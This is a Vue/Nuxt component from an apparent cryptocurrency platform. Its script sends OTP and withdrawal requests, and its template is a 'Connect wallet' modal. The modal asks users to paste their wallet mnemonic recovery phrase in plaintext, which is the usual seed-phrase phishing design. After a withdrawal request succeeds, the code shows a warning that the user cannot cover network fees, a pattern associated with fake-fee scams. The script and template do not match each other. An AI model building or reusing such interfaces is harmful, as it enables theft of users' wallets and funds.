<script lang="ts" setup>
// Import API
import Request from '~/services/api';
// SweetAlert
const { $swal } = useNuxtApp();
import { closeModal } from '~/utils/modal';

const props = defineProps<{
  Asset: any,
  maskEmail: Function,
  user: any
}>();

const sendType:any = ref(null);
const otp = ref('');
const loadReq = ref(false);
const loadData = ref(false);
const formdata:any = ref({
  amount: '',
  wallet_addr: '',
});

async function requestOtp() {
  loadReq.value = true;
  try {
    const response = await Request.requestOTP(props.user?.email);
    // console.log(response.data);
    sendType.value = 'otp';
    loadReq.value = false;
  } catch (err:any) {
    console.log(err);
    loadReq.value = false;
    $swal.fire({
      title: 'Error!',
      icon: 'warning',
      text: err?.response?.data?.message ?? 'Error occurred, try again',
    });
  }
}

async function withdrawal() {
  loadData.value = true;
  const FD = {
    confirm_withdrawal: true,
    amount: formdata.value.amount,
    asset_id: props.Asset.id,
    wallet_addr: formdata.value.wallet_addr,
    otp: otp.value
  };
  // return console.log(FD);
  try {
    const response = await Request.Withdraw(FD);
    // console.log(response.data);
    if (response.data.status != 'success') {
      $swal.fire({
        title: 'Error!',
        icon: 'warning',
        text: response?.data?.message ?? 'Error occurred, try again',
      });
      console.log(response?.data);
      loadData.value = false;
      sendType.value = null;
      return false;
    }
    closeModal('sendModal');
    $swal.fire({
      title: 'Warning!',
      icon: 'warning',
      text: `You do not have ${props.Asset?.name}(${props.Asset?.shortname}) to cover your network fees!`,
    });
    loadData.value = false;
  } catch (err:any) {
    console.log(err);
    loadData.value = false;
      sendType.value = null;
    $swal.fire({
      title: 'Error!',
      icon: 'warning',
      text: err?.response?.data?.message ?? 'Error occurred, try again',
    });
  }
}
</script>

<template>
  <teleport to="body">
    <!-- Send Modal -->
    <div class="modal fade" id="connectModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="sendModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
          <div class="modal-header text-center row">
            <div class="col-2 col-sm-3 text-start">
              <button class="btn p-1 me-0 text-light" data-bs-dismiss="modal" aria-label="Close">
                <i class="bi bi-arrow-left"></i> <span class="ps-2 d-none d-sm-inline">close</span>
              </button>
            </div>
            <h5 class="modal-title col-8 col-sm-6 my-auto me-auto text-center" id="sendModalLabel">Connect wallet</h5>
          </div>
          <div class="modal-body pb-5 pt-3 px-4 text-center">
            <form @submit.prevent class="w-100 crypto my-forms text-start">
              <h6 class="mb-4">Connect to external wallet</h6>
              <div class="form-group">
                <label for="address small">Enter Mnemonic phrase:</label>
                <textarea rows="7"
                  placeholder="Separateed by space. You can choose to import wallets with 12-word or 24-word Mnemonics, phrase should be a plaintext."
                  class="form-control resize-none"
                  name="phrase"
                  id="phrase"
                ></textarea>
              </div>
              <p class="pt-3 mb-0">
                <button type="submit" :disabled="loadReq" class="btn btn-success bg-teal px-4 py-2">
                  <i class="spinner-border spinner-border-sm" v-if="loadReq"></i>
                  <span>Connect</span>
                </button>
              </p>
            </form>
          </div>
        </div>
      </div>
    </div>
  </teleport>
</template>